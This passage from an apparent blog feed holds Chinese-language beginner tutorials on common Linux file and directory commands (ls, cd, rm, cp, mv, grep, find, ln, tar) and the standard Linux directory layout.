<code>上</code>／<code>下</code> 光标键可以在曾经使用过的命令之间来回切换</li><li>如果想要退出选择，并且不想执行当前选中的命令，可以按 <code>ctrl + c</code></li></ul><h3 id="1-2-ls-命令说明"><a href="#1-2-ls-命令说明" class="headerlink" title="1.2 ls 命令说明"></a>1.2 <code>ls</code> 命令说明</h3><ul><li><code>ls</code> 是英文单词 <strong>list</strong> 的简写，其功能为列出目录的内容，是用户最常用的命令之一，类似于 <strong>DOS</strong> 下的 <code>dir</code> 命令</li></ul><h4 id="Linux-下文件和目录的特点"><a href="#Linux-下文件和目录的特点" class="headerlink" title="Linux 下文件和目录的特点"></a>Linux 下文件和目录的特点</h4><ul><li>Linux <strong>文件</strong> 或者 <strong>目录</strong> 名称最长可以有 <code>256</code> 个字符</li><li>以 <code>.</code> 开头的文件为隐藏文件，需要用 -a 参数才能显示</li><li><strong>.</strong> 代表当前目录 </li><li><strong>..</strong> 代表上一级目录  cd ..    返回根目录：        cd /</li></ul><h3 id="1-3-ls-常用选项"><a href="#1-3-ls-常用选项" class="headerlink" title="1.3 ls 常用选项"></a>1.3 ls 常用选项</h3><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>-a</td><td>显示指定目录下所有子目录与文件，包括隐藏文件</td></tr><tr><td>-l</td><td>以列表方式显示文件的详细信息</td></tr><tr><td>-h</td><td>配合 -l 以人性化的方式显示文件大小</td></tr></tbody></table><h4 id="计算机中文件大小的表示方式（科普）"><a href="#计算机中文件大小的表示方式（科普）" class="headerlink" title="计算机中文件大小的表示方式（科普）"></a>计算机中文件大小的表示方式（科普）</h4><table><thead><tr><th>单位</th><th>英文</th><th>含义</th></tr></thead><tbody><tr><td>字节</td><td>B（Byte）</td><td>在计算机中作为一个数字单元，一般为 8 位二进制数</td></tr><tr><td>千</td><td>K（Kibibyte）</td><td>1 KB = 1024 B，千字节 （1024 = 2 ** 10）</td></tr><tr><td>兆</td><td>M（Mebibyte）</td><td>1 MB = 1024 KB，百万字节</td></tr><tr><td>千兆</td><td>G（Gigabyte）</td><td>1 GB = 1024 MB，十亿字节，千兆字节</td></tr><tr><td>太</td><td>T（Terabyte）</td><td>1 TB = 1024 GB，万亿字节，太字节</td></tr><tr><td>拍</td><td>P（Petabyte）</td><td>1 PB = 1024 TB，千万亿字节，拍字节</td></tr><tr><td>艾</td><td>E（Exabyte）</td><td>1 EB = 1024 PB，百亿亿字节，艾字节</td></tr><tr><td>泽</td><td>Z（Zettabyte）</td><td>1 ZB = 1024 EB，十万亿亿字节，泽字节</td></tr><tr><td>尧</td><td>Y（Yottabyte）</td><td>1 YB = 1024 ZB，一亿亿亿字节，尧字节</td></tr></tbody></table><h3 id="1-4-ls-通配符的使用"><a href="#1-4-ls-通配符的使用" class="headerlink" title="1.4 ls 通配符的使用"></a>1.4 ls 通配符的使用</h3><table><thead><tr><th>通配符</th><th>含义</th></tr></thead><tbody><tr><td>*</td><td>代表任意个数个字符</td></tr><tr><td>?</td><td>代表任意一个字符，至少 1 个</td></tr><tr><td>[]</td><td>表示可以匹配字符组中的任一一个</td></tr><tr><td>[abc]</td><td>匹配 a、b、c 中的任意一个</td></tr><tr><td>[a-f]</td><td>匹配从 a 到 f 范围内的的任意一个字符</td></tr></tbody></table><h2 id="02-切换目录"><a href="#02-切换目录" class="headerlink" title="02. 切换目录"></a>02. 切换目录</h2><h3 id="2-1-cd"><a href="#2-1-cd" class="headerlink" title="2.1 cd"></a>2.1 <code>cd</code></h3><ul><li><code>cd</code> 是英文单词 <strong>change directory</strong> 的简写，其功能为更改当前的工作目录，也是用户最常用的命令之一</li></ul><blockquote><p>注意：Linux 所有的 <strong>目录</strong> 和 <strong>文件名</strong> 都是大小写敏感的</p></blockquote><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>cd</td><td>切换到当前用户的主目录(/home/用户目录)</td></tr><tr><td>cd ~</td><td>切换到当前用户的主目录(/home/用户目录)</td></tr><tr><td>cd .</td><td>保持在当前目录不变</td></tr><tr><td>cd ..</td><td>切换到上级目录</td></tr><tr><td>cd -</td><td>可以在最近两次工作目录之间来回切换</td></tr></tbody></table><h3 id="2-2-相对路径和绝对路径"><a href="#2-2-相对路径和绝对路径" class="headerlink" title="2.2 相对路径和绝对路径"></a>2.2 相对路径和绝对路径</h3><ul><li><strong>相对路径</strong> 在输入路径时，最前面不是 <strong>/</strong> 或者 <strong>~**，表示相对 **当前目录</strong> 所在的目录位置</li><li><strong>绝对路径</strong> 在输入路径时，最前面是 <strong>/</strong> 或者 <strong>~**，表示从 **根目录/家目录</strong> 开始的具体目录位置</li></ul><h2 id="03-创建和删除操作"><a href="#03-创建和删除操作" class="headerlink" title="03. 创建和删除操作"></a>03. 创建和删除操作</h2><h3 id="3-1-touch"><a href="#3-1-touch" class="headerlink" title="3.1 touch"></a>3.1 <code>touch</code></h3><ul><li>创建文件或修改文件时间<ul><li>如果文件 <strong>不存在</strong>，可以创建一个空白文件</li><li>如果文件 <strong>已经存在</strong>，可以修改文件的末次修改日期</li></ul></li></ul><h3 id="3-2-mkdir"><a href="#3-2-mkdir" class="headerlink" title="3.2 mkdir"></a>3.2 <code>mkdir</code></h3><ul><li>创建一个新的目录</li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-p</td><td>可以递归创建目录</td></tr></tbody></table><blockquote><p><strong>新建目录的名称</strong> 不能与当前目录中 <strong>已有的目录或文件</strong> 同名</p></blockquote><h3 id="3-3-rm"><a href="#3-3-rm" class="headerlink" title="3.3 rm"></a>3.3 <code>rm</code></h3><ul><li>删除文件或目录</li></ul><blockquote><p>使用 <code>rm</code> 命令要小心，因为文件删除后不能恢复</p></blockquote><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-f</td><td>强制删除，忽略不存在的文件，无需提示</td></tr><tr><td>-r</td><td>递归地删除目录下的内容，<strong>删除文件夹</strong> 时必须加此参数</td></tr></tbody></table><h2 id="04-拷贝和移动文件"><a href="#04-拷贝和移动文件" class="headerlink" title="04. 拷贝和移动文件"></a>04. 拷贝和移动文件</h2><table><thead><tr><th>序号</th><th>命令</th><th>对应英文</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>tree [目录名]</td><td>tree</td><td>以树状图列出文件目录结构</td></tr><tr><td>02</td><td>cp 源文件 目标文件</td><td>copy</td><td>复制文件或者目录</td></tr><tr><td>03</td><td>mv 源文件 目标文件</td><td>move</td><td>移动文件或者目录／文件或者目录重命名</td></tr></tbody></table><h3 id="4-1-tree"><a href="#4-1-tree" class="headerlink" title="4.1 tree"></a>4.1 <code>tree</code></h3><ul><li><code>tree</code> 命令可以以树状图列出文件目录结构</li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-d</td><td>只显示目录</td></tr></tbody></table><h3 id="4-2-cp"><a href="#4-2-cp" class="headerlink" title="4.2 cp"></a>4.2 <code>cp</code></h3><ul><li><code>cp</code> 命令的功能是将给出的 <strong>文件</strong> 或 <strong>目录</strong> 复制到另一个 <strong>文件</strong> 或 <strong>目录</strong> 中，相当于 <strong>DOS</strong> 下的 <code>copy</code> 命令</li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-i</td><td>覆盖文件前提示</td></tr><tr><td>-r</td><td>若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名</td></tr></tbody></table><h3 id="4-3-mv"><a href="#4-3-mv" class="headerlink" title="4.3 mv"></a>4.3 <code>mv</code></h3><ul><li><code>mv</code> 命令可以用来 <strong>移动</strong> <strong>文件</strong> 或 <strong>目录</strong>，也可以给 <strong>文件或目录重命名</strong></li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-i</td><td>覆盖文件前提示</td></tr></tbody></table><h2 id="05-查看文件内容"><a href="#05-查看文件内容" class="headerlink" title="05. 查看文件内容"></a>05. 查看文件内容</h2><table><thead><tr><th>序号</th><th>命令</th><th>对应英文</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>cat 文件名</td><td>concatenate</td><td>查看文件内容、创建文件、文件合并、追加文件内容等功能</td></tr><tr><td>02</td><td>more 文件名</td><td>more</td><td>分屏显示文件内容</td></tr><tr><td>03</td><td>grep 搜索文本 文件名</td><td>grep</td><td>搜索文本文件内容</td></tr></tbody></table><h3 id="5-1-cat"><a href="#5-1-cat" class="headerlink" title="5.1 cat"></a>5.1 <code>cat</code></h3><ul><li><code>cat</code> 命令可以用来 <strong>查看文件内容</strong>、<strong>创建文件</strong>、<strong>文件合并</strong>、<strong>追加文件内容</strong> 等功能</li><li><code>cat</code> 会一次显示所有的内容，适合 <strong>查看内容较少</strong> 的文本文件</li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-b</td><td>对非空输出行编号</td></tr><tr><td>-n</td><td>对输出的所有行编号</td></tr></tbody></table><blockquote><p>Linux 中还有一个 <code>nl</code> 的命令和 <code>cat -b</code> 的效果等价</p></blockquote><h3 id="5-2-more"><a href="#5-2-more" class="headerlink" title="5.2 more"></a>5.2 <code>more</code></h3><ul><li><code>more</code> 命令可以用于分屏显示文件内容，每次只显示一页内容</li><li>适合于 <strong>查看内容较多</strong>的文本文件</li></ul><p>使用 <code>more</code> 的操作键：</p><table><thead><tr><th>操作键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示手册页的下一屏</td></tr><tr><td>Enter 键</td><td>一次滚动手册页的一行</td></tr><tr><td>b</td><td>回滚一屏</td></tr><tr><td>f</td><td>前滚一屏</td></tr><tr><td>q</td><td>退出</td></tr><tr><td>/word</td><td>搜索 <strong>word</strong> 字符串</td></tr></tbody></table><h3 id="5-3-grep"><a href="#5-3-grep" class="headerlink" title="5.3 grep"></a>5.3 <code>grep</code></h3><ul><li>Linux 系统中 <code>grep</code> 命令是一种强大的文本搜索工具</li><li><code>grep</code>允许对文本文件进行 <strong>模式</strong>查找，所谓模式查找，又被称为正则表达式，在就业班会详细讲解</li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-n</td><td>显示匹配行及行号</td></tr><tr><td>-v</td><td>显示不包含匹配文本的所有行（相当于求反）</td></tr><tr><td>-i</td><td>忽略大小写</td></tr></tbody></table><ul><li>常用的两种模式查找</li></ul><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>^a</td><td>行首，搜寻以 <strong>a</strong> 开头的行</td></tr><tr><td>ke$</td><td>行尾，搜寻以 <strong>ke</strong> 结束的行</td></tr></tbody></table><h2 id="06-其他"><a href="#06-其他" class="headerlink" title="06. 其他"></a>06. 其他</h2><h3 id="6-1-echo-文字内容"><a href="#6-1-echo-文字内容" class="headerlink" title="6.1 echo 文字内容"></a>6.1 <code>echo 文字内容</code></h3><ul><li><code>echo</code> 会在终端中显示参数指定的文字，通常会和 <strong>重定向</strong> 联合使用</li></ul><h3 id="6-2-重定向-gt-和-gt-gt"><a href="#6-2-重定向-gt-和-gt-gt" class="headerlink" title="6.2 重定向 &gt; 和 &gt;&gt;"></a>6.2 重定向 <code>&gt;</code> 和 <code>&gt;&gt;</code></h3><ul><li>Linux 允许将命令执行结果 <strong>重定向</strong>到一个 <strong>文件</strong></li><li>将本应显示在<strong>终端上的内容</strong> <strong>输出／追加</strong> 到<strong>指定文件中</strong></li></ul><p>其中</p><ul><li><code>&gt;</code> 表示输出，会覆盖文件原有的内容</li><li><code>&gt;&gt;</code> 表示追加，会将内容追加到已有文件的末尾</li></ul><h3 id="6-3-管道"><a href="#6-3-管道" class="headerlink" title="6.3 管道 |"></a>6.3 管道 <code>|</code></h3><ul><li>Linux 允许将 <strong>一个命令的输出</strong> 可以<strong>通过管道</strong> 做为 <strong>另一个命令的输入</strong></li><li>可以理解现实生活中的管子，管子的一头塞东西进去，另一头取出来，这里 <code>|</code> 的左右分为两端，左端塞东西（写），右端取东西（读）</li></ul><p>常用的管道命令有：</p><ul><li><code>more</code>：分屏显示内容</li><li><code>grep</code>：在命令执行结果的基础上查询指定的文本</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux文件和目录常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件和目录（理解）</title>
      <link href="/2018/05/10/%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%EF%BC%88%E7%90%86%E8%A7%A3%EF%BC%89/"/>
      <url>/2018/05/10/%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%EF%BC%88%E7%90%86%E8%A7%A3%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="文件和目录（理解）"><a href="#文件和目录（理解）" class="headerlink" title="文件和目录（理解）"></a>文件和目录（理解）</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li>理解 Linux 文件目录的结构</li></ul><a id="more"></a><h2 id="01-单用户操作系统和多用户操作系统（科普）"><a href="#01-单用户操作系统和多用户操作系统（科普）" class="headerlink" title="01. 单用户操作系统和多用户操作系统（科普）"></a>01. 单用户操作系统和多用户操作系统（科普）</h2><ul><li><strong>单用户操作系统</strong>：指一台计算机在同一时间 <strong>只能由一个用户</strong> 使用，一个用户独自享用系统的全部硬件和软件资源<ul><li><strong>Windows XP</strong> 之前的版本都是单用户操作系统</li></ul></li><li><strong>多用户操作系统</strong>：指一台计算机在同一时间可以由 <strong>多个用户</strong> 使用，多个用户共同享用系统的全部硬件和软件资源<ul><li><strong>Unix</strong> 和 <strong>Linux</strong> 的设计初衷就是多用户操作系统</li></ul></li></ul><h2 id="02-Windows-和-Linux-文件系统区别"><a href="#02-Windows-和-Linux-文件系统区别" class="headerlink" title="02. Windows 和 Linux 文件系统区别"></a>02. <code>Windows</code> 和 <code>Linux</code> 文件系统区别</h2><h3 id="2-1-Windows-下的文件系统"><a href="#2-1-Windows-下的文件系统" class="headerlink" title="2.1 Windows 下的文件系统"></a>2.1 <code>Windows</code> 下的文件系统</h3><ul><li>在 <code>Windows</code> 下，打开 “计算机”，我们看到的是一个个的驱动器盘符：</li></ul><center><p><img src="/2018/05/10/%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%EF%BC%88%E7%90%86%E8%A7%A3%EF%BC%89/001_Windows%E4%B8%8B%E7%9A%84%E5%A4%9A%E4%B8%AA%E7%9B%98.png"></p></center><ul><li>每个驱动器都有自己的根目录结构，这样形成了多个树并列的情形，如图所示：</li></ul><center><p><img src="/2018/05/10/%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%EF%BC%88%E7%90%86%E8%A7%A3%EF%BC%89/001-Windows%E4%B8%8B%E5%A4%9A%E4%B8%AA%E7%9B%98%E4%B8%BA%E8%8A%82%E7%82%B9%E7%9A%84%E7%9B%AE%E5%BD%95%E5%88%86%E6%94%AF.png"></p></center><h3 id="2-2-Linux-下的文件系统"><a href="#2-2-Linux-下的文件系统" class="headerlink" title="2.2 Linux 下的文件系统"></a>2.2 <code>Linux</code> 下的文件系统</h3><ul><li>在 <code>Linux</code> 下，我们是看不到这些驱动器盘符，我们看到的是文件夹（目录）：</li></ul><center><p><img src="/2018/05/10/%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%EF%BC%88%E7%90%86%E8%A7%A3%EF%BC%89/002_Ubuntu%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95.png"></p></center><ul><li><code>Ubuntu</code> 没有盘符这个概念，只有一个根目录 <code>/</code>，所有文件都在它下面</li></ul><center><p><img src="/2018/05/10/%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%EF%BC%88%E7%90%86%E8%A7%A3%EF%BC%89/003-Linux%E7%9A%84%E6%A0%91%E5%BD%A2%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p></center><h3 id="2-3-用户目录"><a href="#2-3-用户目录" class="headerlink" title="2.3 用户目录"></a>2.3 用户目录</h3><p>位于 <code>/home/user</code>，称之为用户工作目录或家目录，表示方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/user</span><br><span class="line">~</span><br></pre></td></tr></table></figure><h3 id="2-4-Linux-主要目录速查表"><a href="#2-4-Linux-主要目录速查表" class="headerlink" title="2.4 Linux 主要目录速查表"></a>2.4 <code>Linux</code> 主要目录速查表</h3><ul><li>/：根目录，<strong>一般根目录下只存放目录</strong>，在 linux 下有且只有一个根目录，所有的东西都是从这里开始<ul><li>当在终端里输入 <code>/home</code>，其实是在告诉电脑，先从 <code>/</code>（根目录）开始，再进入到 <code>home</code> 目录</li></ul></li><li>/bin、/usr/bin：可执行二进制文件的目录，如常用的命令 ls、tar、mv、cat 等</li><li>/boot：放置 linux 系统启动时用到的一些文件，如 linux 的内核文件：<code>/boot/vmlinuz</code>，系统引导管理器：<code>/boot/grub</code></li><li>/dev：存放linux系统下的设备文件，访问该目录下某个文件，相当于访问某个设备，常用的是挂载光驱<code>mount /dev/cdrom /mnt</code></li><li>/etc：系统配置文件存放的目录，不建议在此目录下存放可执行文件，重要的配置文件有 <ul><li>/etc/inittab</li><li>/etc/fstab</li><li>/etc/init.d</li><li>/etc/X11</li><li>/etc/sysconfig</li><li>/etc/xinetd.d</li></ul></li><li>/home：系统默认的用户家目录，新增用户账号时，用户的家目录都存放在此目录下<ul><li><code>~</code> 表示当前用户的家目录</li><li><code>~edu</code> 表示用户 <code>edu</code> 的家目录</li></ul></li><li>/lib、/usr/lib、/usr/local/lib：系统使用的函数库的目录，程序在执行过程中，需要调用一些额外的参数时需要函数库的协助</li><li>/lost+fount：系统异常产生错误时，会将一些遗失的片段放置于此目录下</li><li>/mnt: /media：光盘默认挂载点，通常光盘挂载于 /mnt/cdrom 下，也不一定，可以选择任意位置进行挂载</li><li>/opt：给主机额外安装软件所摆放的目录</li><li>/proc：此目录的数据都在内存中，如系统核心，外部设备，网络状态，由于数据都存放于内存中，所以不占用磁盘空间，比较重要的文件有：/proc/cpuinfo、/proc/interrupts、/proc/dma、/proc/ioports、/proc/net/* 等</li><li>/root：系统管理员root的家目录</li><li>/sbin、/usr/sbin、/usr/local/sbin：放置系统管理员使用的可执行命令，如 fdisk、shutdown、mount 等。与 /bin 不同的是，这几个目录是给系统管理员 root 使用的命令，一般用户只能”查看”而不能设置和使用</li><li>/tmp：一般用户或正在执行的程序临时存放文件的目录，任何人都可以访问，重要数据不可放置在此目录下</li><li>/srv：服务启动之后需要访问的数据目录，如 www 服务需要访问的网页数据存放在 /srv/www 内</li><li>/usr：应用程序存放目录<ul><li>/usr/bin：存放应用程序</li><li>/usr/share：存放共享数据</li><li>/usr/lib：存放不能直接运行的，却是许多程序运行所必需的一些函数库文件</li><li>/usr/local：存放软件升级包</li><li>/usr/share/doc：系统说明文件存放目录</li><li>/usr/share/man：程序说明文件存放目录</li></ul></li><li>/var：放置系统执行过程中经常变化的文件<ul><li>/var/log：随时更改的日志文件 </li><li>/var/spool/mail：邮件存放的目录</li><li>/var/run：程序或服务启动后，其 PID 存放在该目录下</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux文件和目录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux其他命令</title>
      <link href="/2018/05/10/Linux%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/05/10/Linux%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><a id="more"></a><ul><li>查找文件<ul><li><code>find</code></li></ul></li><li>软链接<ul><li><code>ln</code></li></ul></li><li>打包和压缩<ul><li><code>tar</code></li></ul></li><li>软件安装<ul><li><code>apt-get</code></li></ul></li></ul><h2 id="01-查找文件"><a href="#01-查找文件" class="headerlink" title="01. 查找文件"></a>01. 查找文件</h2><ul><li><code>find</code> 命令功能非常强大，通常用来在 <strong>特定的目录下</strong> <strong>搜索</strong> 符合条件的文件</li></ul><table><thead><tr><th>序号</th><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>find [路径] -name “*.py”</td><td>查找指定路径下扩展名是 <code>.py</code> 的文件，包括子目录</td></tr></tbody></table><ul><li>如果省略路径，表示在当前文件夹下查找</li><li>之前学习的通配符，在使用 <code>find</code> 命令时同时可用</li><li>有关 <code>find</code> 的高级使用，在就业班会讲</li></ul><h3 id="演练目标"><a href="#演练目标" class="headerlink" title="演练目标"></a>演练目标</h3><ul><li><ol><li>搜索桌面目录下，文件名包含 <code>1</code> 的文件</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name <span class="string">&quot;*1*&quot;</span></span><br></pre></td></tr></table></figure><ul><li><ol><li>搜索桌面目录下，所有以 <code>.txt</code> 为扩展名的文件</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name <span class="string">&quot;*.txt&quot;</span></span><br></pre></td></tr></table></figure><ul><li><ol><li>搜索桌面目录下，以数字 <code>1</code> 开头的文件</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name <span class="string">&quot;1*&quot;</span></span><br></pre></td></tr></table></figure><h2 id="02-软链接"><a href="#02-软链接" class="headerlink" title="02. 软链接"></a>02. 软链接</h2><table><thead><tr><th>序号</th><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>ln -s 被链接的源文件 链接文件</td><td>建立文件的软链接，用通俗的方式讲<strong>类似于</strong> Windows 下的<strong>快捷方式</strong></td></tr></tbody></table><ul><li>注意：</li><li><ol><li>没有 <code>-s</code> 选项建立的是一个 <strong>硬链接文件</strong> <ul><li>两个文件占用相同大小的硬盘空间，<strong>工作中几乎不会建立文件的硬链接</strong></li></ul></li></ol></li><li><ol><li><strong>源文件要使用绝对路径</strong>，不能使用相对路径，这样可以方便移动链接文件后，仍然能够正常使用</li></ol></li></ul><h3 id="演练目标-1"><a href="#演练目标-1" class="headerlink" title="演练目标"></a>演练目标</h3><ul><li><ol><li>将桌面目录下的 <code>01.py</code> <strong>移动</strong>到 <code>demo/b/c</code> 目录下</li></ol></li><li><ol><li>在桌面目录下新建 <code>01.py</code> 的 <strong>软链接</strong> <code>FirstPython</code><ul><li>分别使用 <strong>相对路径</strong> 和 <strong>绝对路径</strong> 建立 <code>FirstPython</code> 的软链接</li></ul></li></ol></li><li><ol><li>将 <code>FirstPython</code> <strong>移动</strong>到 <code>demo</code> 目录下，对比使用 <strong>相对路径</strong> 和 <strong>绝对路径</strong> 的区别</li></ol></li></ul><h3 id="硬链接简介（知道）"><a href="#硬链接简介（知道）" class="headerlink" title="硬链接简介（知道）"></a>硬链接简介（知道）</h3><ul><li>在使用 <code>ln</code> 创建链接时，如果没有 <code>-s</code> 选项，会创建一个 <strong>硬链接</strong>，而不是软链接</li></ul><h4 id="硬链接演练"><a href="#硬链接演练" class="headerlink" title="硬链接演练"></a>硬链接演练</h4><ul><li><ol><li>在 <code>~/Desktop/demo</code> 目录下建立 <code>~/Desktop/demo/b/c/01.py</code> 的硬链接 <code>01_hard</code></li></ol></li><li><ol><li>使用 <code>ls -l</code> 查看文件的<strong>硬链接数</strong>（硬链接——有多少种方式可以访问文件或者目录）</li></ol></li><li><ol><li>删除 <code>~/Desktop/demo/b/c/01.py</code>，并且使用 <code>tree</code> 来确认 <code>demo</code> 目录下的三个链接文件</li></ol></li></ul><h4 id="文件软硬链接的示意图"><a href="#文件软硬链接的示意图" class="headerlink" title="文件软硬链接的示意图"></a>文件软硬链接的示意图</h4><center><p><img src="/2018/05/10/Linux%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4/001_%E6%96%87%E4%BB%B6%E8%BD%AF%E7%A1%AC%E9%93%BE%E6%8E%A5%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p></center><blockquote><p>在 Linux 中，<strong>文件名</strong> 和 <strong>文件的数据</strong> 是分开存储的</p></blockquote><ul><li>提示：<ul><li>在 Linux 中，只有文件的 <code>硬链接数 == 0</code> 才会被删除</li><li>使用 <code>ls -l</code> 可以查看一个文件的硬链接的数量</li><li>在日常工作中，几乎不会建立文件的硬链接，知道即可</li></ul></li></ul><h2 id="03-打包压缩"><a href="#03-打包压缩" class="headerlink" title="03. 打包压缩"></a>03. 打包压缩</h2><ul><li><strong>打包压缩</strong> 是日常工作中备份文件的一种方式</li><li>在不同操作系统中，常用的打包压缩方式是不同的<ul><li><code>Windows</code> 常用 <code>rar</code></li><li><code>Mac</code> 常用 <code>zip</code></li><li><code>Linux</code> 常用 <code>tar.gz</code></li></ul></li></ul><h3 id="3-1-打包-／-解包"><a href="#3-1-打包-／-解包" class="headerlink" title="3.1 打包 ／ 解包"></a>3.1 打包 ／ 解包</h3><ul><li><code>tar</code> 是 Linux 中最常用的 <strong>备份</strong>工具，此命令可以 <strong>把一系列文件</strong> 打包到 <strong>一个大文件中</strong>，也可以把一个 <strong>打包的大文件恢复成一系列文件</strong></li><li><code>tar</code> 的命令格式如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打包文件</span></span><br><span class="line">tar -cvf 打包文件.tar 被打包的文件／路径...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解包文件</span></span><br><span class="line">tar -xvf 打包文件.tar</span><br></pre></td></tr></table></figure><ul><li><code>tar</code> 选项说明</li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>c</td><td>生成档案文件，创建打包文件</td></tr><tr><td>x</td><td>解开档案文件</td></tr><tr><td>v</td><td>列出归档解档的详细过程，显示进度</td></tr><tr><td>f</td><td>指定档案文件名称，f 后面一定是 .tar 文件，所以必须放选项最后</td></tr></tbody></table><blockquote><p>注意：<code>f</code> 选项必须放在最后，其他选项顺序可以随意</p></blockquote><h4 id="打包解包演练"><a href="#打包解包演练" class="headerlink" title="打包解包演练"></a>打包解包演练</h4><ol><li>删除桌面下的所有内容</li><li>在桌面下新建三个空白文件 <code>01.py</code>、<code>02.py</code>、<code>03.py</code></li><li>将这三个文件打一个 <code>py.tar</code> 的包</li><li>新建 <code>tar</code> 目录，并且将 <code>py.tar</code> 移动到 <code>tar</code> 目录下</li><li>解包 <code>py.tar</code></li></ol><h3 id="3-2-压缩／解压缩"><a href="#3-2-压缩／解压缩" class="headerlink" title="3.2 压缩／解压缩"></a>3.2 压缩／解压缩</h3><h4 id="1-gzip"><a href="#1-gzip" class="headerlink" title="1) gzip"></a>1) <code>gzip</code></h4><ul><li><code>tar</code> 与 <code>gzip</code> 命令结合可以使用实现文件 <strong>打包和压缩</strong><ul><li><code>tar</code> 只负责打包文件，但不压缩</li><li>用 <code>gzip</code> 压缩 <code>tar</code> 打包后的文件，其扩展名一般用 <code>xxx.tar.gz</code></li></ul></li></ul><blockquote><p>在 <code>Linux</code> 中，最常见的压缩文件格式就是 <code>xxx.tar.gz</code></p></blockquote><ul><li>在 <code>tar</code> 命令中有一个选项 <strong>-z</strong> 可以调用 <code>gzip</code>，从而可以方便的实现压缩和解压缩的功能</li><li>命令格式如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 压缩文件</span></span><br><span class="line">tar -zcvf 打包文件.tar.gz 被压缩的文件／路径...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压缩文件</span></span><br><span class="line">tar -zxvf 打包文件.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压缩到指定路径</span></span><br><span class="line">tar -zxvf 打包文件.tar.gz -C 目标路径</span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-C</td><td>解压缩到指定目录，注意：要解压缩的目录必须存在</td></tr></tbody></table><h4 id="2-bzip2-two"><a href="#2-bzip2-two" class="headerlink" title="2) bzip2(two)"></a>2) <code>bzip2(two)</code></h4><ul><li><code>tar</code> 与 <code>bzip2</code> 命令结合可以使用实现文件 <strong>打包和压缩</strong>（用法和 <code>gzip</code> 一样）<ul><li><code>tar</code> 只负责打包文件，但不压缩，</li><li>用 <code>bzip2</code> 压缩 <code>tar</code> 打包后的文件，其扩展名一般用 <code>xxx.tar.bz2</code></li></ul></li><li>在 <code>tar</code> 命令中有一个选项 <strong>-j</strong> 可以调用 <code>bzip2</code>，从而可以方便的实现压缩和解压缩的功能</li><li>命令格式如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 压缩文件</span></span><br><span class="line">tar -jcvf 打包文件.tar.bz2 被压缩的文件／路径...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压缩文件</span></span><br><span class="line">tar -jxvf 